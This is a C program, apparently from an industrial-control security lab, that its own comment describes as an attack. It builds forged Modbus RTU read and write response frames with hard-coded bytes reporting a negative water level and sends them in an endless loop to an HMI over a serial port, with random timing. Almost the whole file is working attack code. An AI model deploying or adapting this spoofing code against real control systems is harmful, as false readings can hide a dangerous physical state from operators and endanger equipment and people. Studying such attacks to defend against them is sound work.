/* This attack will insert a negative water level into the communication to the HMI */


#define FORLINUX
#include "modbus.h"
#define NUMPDU 2

int main(int argc, char *argv[]) {
  unsigned char  addr, fc, data[256], crc[2];
  int datalen;
  char inport[100], outport[100];


  int i, j, len, err;
  int port;
  struct modbus_pdu *pdu;

  strcpy(inport,"/dev/ttyS0");
  strcpy(outport,"/dev/ttyS1");
  
  for (i=1;i<argc;i++) {
    if (strcmp(argv[i], "-inport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(inport, argv[i+1],len); 
      i++;
      printf("INFO: Input port = %s\n", inport);
    } else if (strcmp(argv[i], "-outport") == 0) {
      len = strlen(argv[i+1]);
      if (len > 100) {
         printf("Error: Port name must be less then 100 characters long.\n");
         return(-1);
      };
      strncpy(outport, argv[i+1],len); 
      i++;
    } else {
      printf("ERROR: Illegal argument (%s)\n", argv[i]);
      printf("Usage: %s -inport /dev/ttyXX -outport /dev/ttyYY\n", argv[0]);
      return (-1);
    }
  }

 port = openport(outport);
  if (port < 0) { 
   return (port);
  }

  printf("open %s ok port = %d\n", outport, port);

 while (1) {  
    addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x3;
    datalen = 21;
    data[0] = 0x14;
    data[1] = 0x10;
    data[2] = 0x00;
    data[3] = 0x0e;
    data[4] = 0x00;
    data[5] = 0x0b;
    data[6] = 0xf2;
    data[7] = 0x00;
    data[8] = 0x01;
    data[9] = 0x00;
    data[10] = 0x00;
    data[11] = 0x00;
    data[12] = 0x00;
    data[13] = 0x00;
    data[14] = 0x00;
    data[15] = 0xc1;
    data[16] = 0x63;
    data[17] = 0xdb;
    data[18] = 0x53;
    data[19] = 0x00;
    data[20] = 0x00;
    crc[0] = 0x81;
    crc[1] = 0x4a;

 pdu = mkpdu(addr, fc, data, datalen, crc);
 printmodbuspdu(pdu);

 sendmodbus_RTU(port, pdu); // Send read response
 freepdu(pdu);
 sleep(1); // change to random time in the future.

    addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x10;
    datalen = 4;
    data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x0a;
   crc[0] = 0x93;
   crc[1] = 0xb8;

 pdu = mkpdu(addr, fc, data, datalen, crc); 
 //pdu->crc[0] = 0xc0;
//pdu->crc[1] = 0x35;
 printmodbuspdu(pdu);

 sendmodbus_RTU(port, pdu);    //Send Write response
 freepdu(pdu);
 sleep(drand48()*5); //Sleep random amount of time 
 pdu = mkpdu(addr, fc, data, datalen, crc);
 printmodbuspdu(pdu);

  sendmodbus_RTU(port, pdu); //Sen Write response
   freepdu(pdu);
   sleep(1);

 addr = (unsigned char) 0x7;
    fc = (unsigned char) 0x10;
    datalen = 4;
    data[0] = 0x0b;
    data[1] = 0xe9;
    data[2] = 0x00;
    data[3] = 0x0a;
    crc[0] = 0x93;
    crc[1] = 0xb8;
   
  pdu = mkpdu(addr, fc, data, datalen, crc); 
   printmodbuspdu(pdu);

 sendmodbus_RTU(port, pdu); //Send write response
 freepdu(pdu);
 sleep(1);


}
}
